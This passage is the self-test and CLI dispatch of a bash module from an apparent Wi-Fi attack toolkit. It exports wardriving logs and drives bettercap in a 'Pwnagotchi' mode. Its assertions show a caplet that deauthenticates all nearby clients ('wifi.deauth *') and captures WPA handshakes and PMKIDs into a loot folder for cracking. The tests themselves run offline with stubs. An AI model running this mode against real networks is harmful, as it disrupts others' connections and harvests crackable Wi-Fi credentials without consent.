    # header line. The GPX writer used to skip only one of them (tail -n +2)
    # and turned the column header into a bogus waypoint named "SSID" at
    # lat="CurrentLatitude" lon="CurrentLongitude" with <ele>AltitudeMeters</ele>.
    cat > "$MOD_TMP/gpx.wiglecsv" <<'CSV'
WigleWifi-1.4,appRelease=wifisting,model=selftest
MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type
AA:BB:CC:DD:EE:01,Home Net,[WPA2][ESS],2020-01-01 00:00:00,6,-45,52.100000,4.200000,10.0,5.0,WIFI
AA:BB:CC:DD:EE:02,,[WPA2][ESS],2020-01-01 00:00:01,11,-70,52.200000,4.300000,11.0,5.0,WIFI
AA:BB:CC:DD:EE:03,NoFix,[ESS],2020-01-01 00:00:02,1,-80,0,0,0,0,WIFI
AA:BB:CC:DD:EE:04,Bob & Alice <Net>,[WPA2][ESS],2020-01-01 00:00:03,1,-88,52.300000,4.400000,0,5.0,WIFI
CSV
    wardrive_export_gpx "$MOD_TMP/gpx.wiglecsv" >/dev/null 2>&1
    chk gpx-rc "$?" "0"
    local gpx="$MOD_TMP/gpx.gpx"
    chk gpx-wpt-count "$(grep -c '<wpt ' "$gpx")" "3"
    chk gpx-coords "$(grep -c '<wpt lat="52.100000" lon="4.200000">' "$gpx")" "1"
    chk gpx-name-escaped "$(grep -c '<name>Bob &amp; Alice &lt;Net&gt;</name>' "$gpx")" "1"
    chk gpx-hidden-name "$(grep -c '<name>&lt;hidden&gt;</name>' "$gpx")" "1"
    # alt=0 (unknown) must not emit an <ele> element.
    chk gpx-ele-count "$(grep -c '<ele>' "$gpx")" "2"
    chk gpx-no-zero-fix "$(grep -c 'lat="0"' "$gpx")" "0"
    # Neither header line may become a waypoint.
    chk gpx-no-header-wpt   "$(grep -c 'lat="CurrentLatitude"' "$gpx")" "0"
    chk gpx-no-header-name  "$(grep -c '<name>SSID</name>' "$gpx")" "0"
    chk gpx-no-header-ssid  "$(grep -c 'MAC,SSID' "$gpx")" "0"
    chk gpx-no-preamble     "$(grep -c 'WigleWifi-1.4' "$gpx")" "0"

    # ── KML export (skips both header lines, keeps coordinates in lon,lat) ──
    wardrive_wiglecsv_to_kml "$MOD_TMP/test.wiglecsv" "$MOD_TMP/test.kml"
    chk kml-placemarks "$(grep -c '<Placemark>' "$MOD_TMP/test.kml")" "3"
    chk kml-coords "$(grep -c '<coordinates>4.200000,52.100000,10.0</coordinates>' "$MOD_TMP/test.kml")" "1"
    chk kml-no-header "$(grep -c 'MAC,SSID' "$MOD_TMP/test.kml")" "0"

    # ── --export-kml falls back to the wiglecsv when kismetdb_to_kml is absent ──
    if ! command -v kismetdb_to_kml >/dev/null 2>&1; then
        rm -f "$MOD_TMP/test.kml"
        wardrive_export_kml >/dev/null 2>&1
        chk export-kml-rc "$?" "0"
        chk export-kml-fallback "$(grep -c '<Placemark>' "$MOD_TMP/test.kml" 2>/dev/null)" "3"
    fi

    # No log at all must be an error, never an empty success.
    rc=0
    ( WARDRIVE_DIR="$MOD_TMP/empty"; mkdir -p "$WARDRIVE_DIR"; wardrive_export_kml ) >/dev/null 2>&1 || rc=$?
    chk export-kml-nolog-rc "$rc" "1"

    # ── CLI dispatch ──
    rc=0; wardrive_cli_main --no-such-flag >/dev/null 2>&1 || rc=$?
    chk unknown-command-rc "$rc" "2"
    # With no gpspipe the quality probe must say so instead of inventing a fix.
    if ! command -v gpspipe >/dev/null 2>&1; then
        local gq
        gq=$(wardrive_gps_quality_tsv); rc=$?
        chk gps-quality-no-gpspipe-rc "$rc" "1"
        chk gps-quality-no-gpspipe-tsv "$gq" "$(printf 'available\t0')"
    fi

    # ══ Pwnagotchi mode (bettercap) ══
    # Offline: bettercap is never launched. Every pwn path is redirected into
    # $MOD_TMP, so the real scratch dir and the loot tree stay untouched.
    local save_pdir="$WARD_PWN_DIR" save_ploot="$WARD_PWN_LOOT"
    WARD_PWN_DIR="$MOD_TMP/pwn"
    WARD_PWN_OUT="$WARD_PWN_DIR/out"
    WARD_PWN_CAPLET="$WARD_PWN_DIR/pwnagotchi.cap"
    WARD_PWN_PID="$WARD_PWN_DIR/bettercap.pid"
    WARD_PWN_HOLDER="$WARD_PWN_DIR/stdin-holder.pid"
    WARD_PWN_FIFO="$WARD_PWN_DIR/stdin.fifo"
    WARD_PWN_LOG="$WARD_PWN_DIR/bettercap.log"
    WARD_PWN_ENV="$WARD_PWN_DIR/api.env"
    WARD_PWN_LOOT="$MOD_TMP/loot"
    mkdir -p "$WARD_PWN_DIR"

    # ── caplet generation ──
    ward_pwn_write_caplet wlan0
    chk caplet-rc             "$?" "0"
    chk caplet-exists         "$([[ -s "$WARD_PWN_CAPLET" ]] && echo yes || echo no)" "yes"
    chk caplet-interface      "$(grep -c '^set wifi.interface wlan0$' "$WARD_PWN_CAPLET")" "1"
    chk caplet-handshakes-file \
        "$(grep -c "^set wifi.handshakes.file $WARD_PWN_OUT/handshakes.pcap$" "$WARD_PWN_CAPLET")" "1"
    chk caplet-pmkid-file \
        "$(grep -c "^set wifi.pmkid.file $WARD_PWN_OUT/pmkid.pcap$" "$WARD_PWN_CAPLET")" "1"
    chk caplet-recon-on       "$(grep -c '^wifi.recon on$' "$WARD_PWN_CAPLET")" "1"
    chk caplet-api-on         "$(grep -c '^api.rest on$' "$WARD_PWN_CAPLET")" "1"
    chk caplet-api-port       "$(grep -c "^set api.rest.port $WARD_PWN_PORT$" "$WARD_PWN_CAPLET")" "1"
    chk caplet-api-loopback   "$(grep -c '^set api.rest.address 127.0.0.1$' "$WARD_PWN_CAPLET")" "1"
    chk caplet-hunt-ticker    "$(grep -c '^set ticker.commands "wifi.deauth \*; wifi.assoc \*"$' "$WARD_PWN_CAPLET")" "1"
    chk caplet-mode-600       "$(stat -c%a "$WARD_PWN_CAPLET")" "600"
    # The caplet must not point at the loot tree: bettercap writes pcaps
    # continuously, and the loot copy is --pwn-export's job.
    chk caplet-not-in-loot    "$(grep -c "$WARD_PWN_LOOT" "$WARD_PWN_CAPLET")" "0"
    # bettercap's caplet evaluator stops at the first line it cannot run, so
    # the pmkid setting (absent from bettercap 2.32) must come last: a build
    # that rejects it loses that one setting, never wifi.recon.
    recon_ln=$(grep -n '^wifi.recon on$' "$WARD_PWN_CAPLET" | cut -d: -f1)
    pmkid_ln=$(grep -n '^set wifi.pmkid.file' "$WARD_PWN_CAPLET" | cut -d: -f1)
    chk caplet-pmkid-after-recon "$([[ -n "$pmkid_ln" && "$pmkid_ln" -gt "$recon_ln" ]] && echo yes || echo no)" "yes"

    # ── API credentials ──
    chk env-mode-600          "$(stat -c%a "$WARD_PWN_ENV")" "600"
    chk env-user              "$(ward_pwn_env_get api_user)" "wifisting"
    chk env-pass-length       "$(ward_pwn_env_get api_pass | tr -d '\n' | wc -c)" "24"
    local pass1; pass1=$(ward_pwn_env_get api_pass)
    ward_pwn_write_caplet wlan0
    chk env-pass-stable       "$(ward_pwn_env_get api_pass)" "$pass1"
    chk caplet-has-api-pass   "$(grep -c "^set api.rest.password $pass1$" "$WARD_PWN_CAPLET")" "1"

    # bettercap 2.32 has no wifi.pmkid.file; the probe must answer, not guess.
    ward_pwn_pmkid_param_supported
    chk pmkid-probe-against-binary "$?" \
        "$(grep -qa 'wifi\.pmkid\.file' "$(command -v bettercap)" 2>/dev/null && echo 0 || echo 1)"

    # ── pidfile round-trip: live pid, stale pid, garbage ──
    local stale; stale=$(cat /proc/sys/kernel/pid_max)
    printf '%s\n' "$$" > "$WARD_PWN_PID"
    chk pidfile-read-live     "$(ward_pwn_pidfile_read)" "$$"
    ward_pwn_running;         chk pidfile-live-running "$?" "0"
    printf '%s\n' "$stale" > "$WARD_PWN_PID"
    chk pidfile-read-stale    "$(ward_pwn_pidfile_read)" "$stale"
    ward_pwn_running;         chk pidfile-stale-not-running "$?" "1"
    printf 'garbage\n' > "$WARD_PWN_PID"
    chk pidfile-garbage-empty "$(ward_pwn_pidfile_read)" ""
    ward_pwn_running;         chk pidfile-garbage-not-running "$?" "1"

    # ── --pwn-status-tsv on a stale pidfile says not-running ──
    printf '%s\n' "$stale" > "$WARD_PWN_PID"
    local pst; pst=$(wardrive_cli_pwn_status_tsv); rc=$?
    chk status-rc             "$rc" "0"
    chk status-stale-running  "$(wfld running <<<"$pst")" "0"
    chk status-stale-pid      "$(wfld pid <<<"$pst")" "$stale"
    chk status-caplet         "$(wfld caplet <<<"$pst")" "$WARD_PWN_CAPLET"
    chk status-out-dir        "$(wfld out_dir <<<"$pst")" "$WARD_PWN_OUT"
    chk status-empty-pcaps    "$(wfld pcaps <<<"$pst")" "0"
    chk status-empty-hs       "$(wfld handshakes <<<"$pst")" "0"
    chk status-empty-pm       "$(wfld pmkids <<<"$pst")" "0"
    chk status-api-endpoint   "$(wfld api <<<"$pst")" "http://127.0.0.1:$WARD_PWN_PORT/api/"

    # A live pid: running=1 and a numeric uptime.
    printf '%s\n' "$$" > "$WARD_PWN_PID"
    pst=$(wardrive_cli_pwn_status_tsv)
    chk status-live-running   "$(wfld running <<<"$pst")" "1"
    chk status-live-uptime    "$([[ "$(wfld uptime_s <<<"$pst")" =~ ^[0-9]+$ ]] && echo numeric || echo bad)" "numeric"

    # ── counting reads the output dir, it does not invent numbers ──
    # A syntactically valid pcap with a single beacon frame: hcxpcapngtool
    # parses it, finds no EAPOL pair and no PMKID, and the module must report
    # exactly that instead of a hopeful count.
    if command -v python3 >/dev/null 2>&1; then
        python3 - "$WARD_PWN_OUT/handshakes.pcap" <<'PY'
import struct, sys
hdr = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 105)
frame = (struct.pack("<HH", 0x0080, 0)
         + b"\xff" * 6
         + b"\x02\x00\x00\x00\x00\x01" + b"\x02\x00\x00\x00\x00\x01"
         + struct.pack("<H", 0x0010)
         + b"\x00" * 8 + struct.pack("<H", 100)
         + struct.pack("<H", 0x0001) + b"\x04TEST")
rec = struct.pack("<IIII", 0, 0, len(frame), len(frame)) + frame
with open(sys.argv[1], "wb") as fh:
    fh.write(hdr + rec)
PY
        local cnt; cnt=$(ward_pwn_count_hashes "$WARD_PWN_OUT")
        chk count-pcaps       "$(cut -f1 <<<"$cnt")" "1"
        chk count-handshakes  "$(cut -f2 <<<"$cnt")" "0"
        chk count-pmkids      "$(cut -f3 <<<"$cnt")" "0"
    else
        printf 'count-pcaps\tSKIP (python3 not installed)\n'
    fi

    # ── --pwn-export copies into the loot dir it was pointed at ──
    local exp erc
    exp=$(wardrive_cli_pwn_export 2>&1); erc=$?
    chk export-rc             "$erc" "0"
    chk export-loot-parent    "$(dirname "$(wfld LOOT <<<"$exp")")" "$WARD_PWN_LOOT"
    chk export-pcaps          "$(wfld PCAPS <<<"$exp")" "1"
    chk export-handshakes     "$(wfld HANDSHAKES <<<"$exp")" "0"
    chk export-pmkids         "$(wfld PMKIDS <<<"$exp")" "0"
    # Zero key material must be said out loud, not glossed over.
    chk export-says-empty     "$(grep -c 'no usable key material' <<<"$exp")" "1"
    chk export-pcap-copied \
        "$(ls -1 "$(wfld LOOT <<<"$exp")"/*.pcap 2>/dev/null | wc -l)" "1"

    # Nothing collected is an error, never an empty success.
    mkdir -p "$MOD_TMP/empty_out"
    wardrive_cli_pwn_export "$MOD_TMP/empty_out" >/dev/null 2>&1
    chk export-empty-rc       "$?" "1"

    # ── interface gate ──
    local iout irc
    ward_pwn_check_iface "" >/dev/null 2>&1
    chk iface-empty-rc        "$?" "1"
    iout=$(ward_pwn_check_iface "" 2>&1); irc=$?
    chk iface-empty-rc2       "$irc" "1"
    chk iface-empty-names     "$(grep -c 'no monitor-capable interface' <<<"$iout")" "1"
    iout=$(ward_pwn_check_iface wf_nosuch0 2>&1); irc=$?
    chk iface-missing-rc      "$irc" "1"
    chk iface-missing-names   "$(grep -c 'wf_nosuch0' <<<"$iout")" "1"
    # loopback exists but has no wireless phy: a real refusal, named.
    iout=$(ward_pwn_check_iface lo 2>&1); irc=$?
    chk iface-notmon-rc       "$irc" "1"
    chk iface-notmon-names    "$(grep -c 'not monitor-capable' <<<"$iout")" "1"
    chk iface-notmon-names-it "$(grep -c 'interface lo is not monitor-capable' <<<"$iout")" "1"
    # and the same refusal through the CLI entry point
    iout=$(wardrive_cli_main --pwn-start wf_nosuch0 2>&1); irc=$?
    chk pwn-start-badiface-rc    "$irc" "1"
    chk pwn-start-badiface-names "$(grep -c 'wf_nosuch0' <<<"$iout")" "1"

    mkdir -p "$MOD_TMP/bin"
    cat > "$MOD_TMP/bin/iw" <<'STUB'
#!/usr/bin/env bash
case "$*" in
    "dev lo info") printf 'Interface lo\n\ttype monitor\n' ;;
esac
exit 0
STUB
    chmod +x "$MOD_TMP/bin/iw"
    PATH="$MOD_TMP/bin:$PATH" ward_pwn_check_iface lo >/dev/null 2>&1
    chk iface-monitor-accepted "$?" "0"
    chk resolve-explicit       "$(ward_pwn_resolve_iface wlan9)" "wlan9"
    chk resolve-from-mon-iface "$(MON_IFACE=wlan8 ward_pwn_resolve_iface)" "wlan8"

    # ── the stdin holder: bettercap must not see EOF and spin ──
    ward_pwn_fifo_hold $$ >/dev/null 2>&1
    chk fifo-holder-alive \
        "$([[ -d "/proc/$(tr -dc '0-9' < "$WARD_PWN_HOLDER" 2>/dev/null)" ]] && echo alive || echo dead)" "alive"
    timeout 1 bash -c "read -r x < '$WARD_PWN_FIFO'" 2>/dev/null
    chk fifo-blocks-reader    "$?" "124"
    ward_pwn_holder_stop
    chk fifo-removed          "$([[ -e "$WARD_PWN_FIFO" ]] && echo present || echo gone)" "gone"

    # ── --pwn-start, success path, with a stub bettercap ──
    # The stub answers the REST port with 200 and stays alive; the module has
    # to accept that as a real start, and --pwn-stop has to reap it. No radio
    # and no root involved, and the iface gate is satisfied with the stub iw
    # above (lo reported as monitor).
    if command -v python3 >/dev/null 2>&1; then
        cat > "$MOD_TMP/bin/bettercap" <<'STUB'
#!/usr/bin/env bash
printf '%s\n' "$*" > "$STUB_ARGS"
caplet=""
while (($#)); do
    if [[ "$1" == "-caplet" ]]; then caplet="$2"; shift 2; continue; fi
    shift
done
port=$(awk -F'[ =]+' '$1=="set" && $2=="api.rest.port" {print $3}' "$caplet")
[[ -n "$port" ]] || exit 3
exec python3 -c '
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"{}")
    def log_message(self, *a):
        pass
http.server.HTTPServer(("127.0.0.1", int(sys.argv[1])), H).serve_forever()
' "$port"
STUB
        chmod +x "$MOD_TMP/bin/bettercap"
        rm -f "$WARD_PWN_PID"
        # A port derived from this run's pid: two concurrent selftests must
        # not fight over one REST port (the stub below really binds it).
        WARD_PWN_PORT=$(( 20000 + ($$ % 1000) ))
        (
            export PATH="$MOD_TMP/bin:$PATH" STUB_ARGS="$MOD_TMP/stub_bc_args.txt"
            wardrive_cli_pwn_start lo > "$MOD_TMP/start.out" 2>&1
            printf '%s' "$?" > "$MOD_TMP/start.rc"
        )
        chk start-stub-rc        "$(cat "$MOD_TMP/start.rc")" "0"
        chk start-stub-argv      "$(cat "$MOD_TMP/stub_bc_args.txt")" \
            "-no-colors -iface lo -caplet $WARD_PWN_CAPLET"
        chk start-says-started   "$([[ -n "$(wfld STARTED <<<"$(cat "$MOD_TMP/start.out")")" ]] && echo yes || echo no)" "yes"
        chk start-verify-line    "$(grep -c '^VERIFY' "$MOD_TMP/start.out")" "1"
        chk start-api-line       "$(wfld API <<<"$(cat "$MOD_TMP/start.out")")" \
            "http://127.0.0.1:$(ward_pwn_api_port)/api/"
        chk start-emits-pid      "$(cat "$WARD_PWN_PID")" "$(wfld STARTED <<<"$(cat "$MOD_TMP/start.out")")"
        worker_pid=$(cat "$WARD_PWN_PID")
        chk start-still-alive \
            "$([[ -n "$worker_pid" && -d "/proc/$worker_pid" ]] && echo alive || echo dead)" "alive"
        # a second start must refuse rather than stack instances
        (
            export PATH="$MOD_TMP/bin:$PATH" STUB_ARGS="$MOD_TMP/stub_bc_args2.txt"
            wardrive_cli_pwn_start lo > "$MOD_TMP/start2.out" 2>&1
            printf '%s' "$?" > "$MOD_TMP/start2.rc"
        )
        chk start-twice-rc       "$(cat "$MOD_TMP/start2.rc")" "1"
        chk start-twice-names    "$(grep -c 'already running' "$MOD_TMP/start2.out")" "1"

        sout=$(wardrive_cli_pwn_stop 2>&1); src=$?
        chk start-then-stop-rc   "$src" "0"
        chk start-then-stop-says "$(awk -F'\t' '$1=="STOPPED"{print $2}' <<<"$sout")" "1"
        chk start-then-stop-dead "$([[ -d "/proc/$worker_pid" ]] && echo alive || echo dead)" "dead"
    else
        printf 'start-stub-success\tSKIP (python3 not installed)\n'
    fi

    # ── --pwn-stop: reaps a live process, idempotent when idle ──
    sleep 300 &
    local victim=$!
    printf '%s\n' "$victim" > "$WARD_PWN_PID"
    local sout src
    sout=$(wardrive_cli_pwn_stop 2>&1); src=$?
    chk pwn-stop-live-rc      "$src" "0"
    chk pwn-stop-live-says    "$(awk -F'\t' '$1=="STOPPED"{print $2}' <<<"$sout")" "1"
    chk pwn-stop-live-dead    "$([[ -d "/proc/$victim" ]] && echo alive || echo dead)" "dead"
    chk pwn-stop-live-pidfile "$([[ -f "$WARD_PWN_PID" ]] && echo kept || echo gone)" "gone"

    sout=$(wardrive_cli_pwn_stop 2>&1); src=$?
    chk pwn-stop-idle-rc      "$src" "0"
    chk pwn-stop-idle-says    "$(awk -F'\t' '$1=="STOPPED"{print $2}' <<<"$sout")" "0"
    sout=$(wardrive_cli_pwn_stop 2>&1); src=$?
    chk pwn-stop-again-rc     "$src" "0"
    chk pwn-stop-again-says   "$(awk -F'\t' '$1=="STOPPED"{print $2}' <<<"$sout")" "0"

    # A stale pidfile is reaped and reported as nothing-running, then dropped.
    printf '%s\n' "$stale" > "$WARD_PWN_PID"
    sout=$(wardrive_cli_pwn_stop 2>&1); src=$?
    chk pwn-stop-stale-rc     "$src" "0"
    chk pwn-stop-stale-says   "$(awk -F'\t' '$1=="STOPPED"{print $2}' <<<"$sout")" "0"
    chk pwn-stop-stale-drops  "$([[ -f "$WARD_PWN_PID" ]] && echo kept || echo gone)" "gone"

    # ── --info covers the pwn verbs ──
    local inf; inf=$(wardrive_cli_info)
    for v in --pwn-start --pwn-stop --pwn-status-tsv --pwn-export; do
        chk "info-mentions-$v" "$(grep -q -- "$v" <<<"$inf" && echo yes || echo no)" "yes"
    done
    chk info-says-unverified "$(grep -c 'cannot confirm' <<<"$inf")" "1"

    WARD_PWN_DIR="$save_pdir"
    WARD_PWN_OUT="$WARD_PWN_DIR/out"
    WARD_PWN_CAPLET="$WARD_PWN_DIR/pwnagotchi.cap"
    WARD_PWN_PID="$WARD_PWN_DIR/bettercap.pid"
    WARD_PWN_HOLDER="$WARD_PWN_DIR/stdin-holder.pid"
    WARD_PWN_FIFO="$WARD_PWN_DIR/stdin.fifo"
    WARD_PWN_LOG="$WARD_PWN_DIR/bettercap.log"
    WARD_PWN_ENV="$WARD_PWN_DIR/api.env"
    WARD_PWN_LOOT="$save_ploot"

    WARDRIVE_DIR="$save_wd"
    rm -rf "$MOD_TMP"

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

wardrive_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)         wardrive_cli_status_tsv ;;
        --gps-quality-tsv)    wardrive_gps_quality_tsv ;;
        --check-stack)        wardrive_cli_check_stack ;;
        --set-gps)            wardrive_cli_set_gps "$@" ;;
        --start-gpsd)         wardrive_cli_start_gpsd "$@" ;;
        --start)              wardrive_cli_start ;;
        --stop)               wardrive_cli_stop ;;
        --export-kml)         wardrive_cli_export_kml "$@" ;;
        --export-gpx)         wardrive_export_gpx "$@" ;;
        --wigle-upload)       wardrive_cli_wigle_upload "$@" ;;
        --list-logs-tsv)      wardrive_cli_list_logs_tsv ;;
        --heatmap)wardrive_heatmap "$@" ;;
        --wigle-upload-latest)wardrive_wigle_upload_latest ;;
        --pwn-start)          wardrive_cli_pwn_start "$@" ;;
        --pwn-stop)           wardrive_cli_pwn_stop ;;
        --pwn-status-tsv)     wardrive_cli_pwn_status_tsv ;;
        --pwn-export)         wardrive_cli_pwn_export "$@" ;;
        --info)               wardrive_cli_info ;;
        --selftest)           wardrive_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --gps-quality-tsv
  --check-stack
  --set-gps /dev/ttyUSB0
  --start-gpsd [DEVICE]
  --start
  --stop
  --export-kml [LOG]
  --export-gpx [WIGLECSV]
  --wigle-upload WIGLECSV
  --list-logs-tsv
  --heatmap [LOG] [OUT]
  --pwn-start [IFACE]         bettercap recon + handshake/PMKID hunt (monitor iface required)
  --pwn-stop                  reap bettercap (idempotent; exits 0 when nothing runs)
  --pwn-status-tsv            running/pid/uptime, handshakes and PMKIDs on disk, caplet path
  --pwn-export                copy collected .pcap/.22000 into the wardrive loot dir
  --info                      what every verb does, and what it cannot do
  --selftest                  offline assertions, no hardware
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    : "${TMP_DIR:=/tmp/wifisting}"
    : "${LOOT_DIR:=$HOME/wifisting/loot}"
    : "${CAPTURES_DIR:=$HOME/wifisting/captures}"
    : "${LOGS_DIR:=$HOME/wifisting/logs}"
    : "${WIFISTING_HOME:=$HOME/wifisting}"
    : "${WIFISTING_ROOT:=$HOME/wifisting}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR"
    wardrive_cli_main "$@"
fi
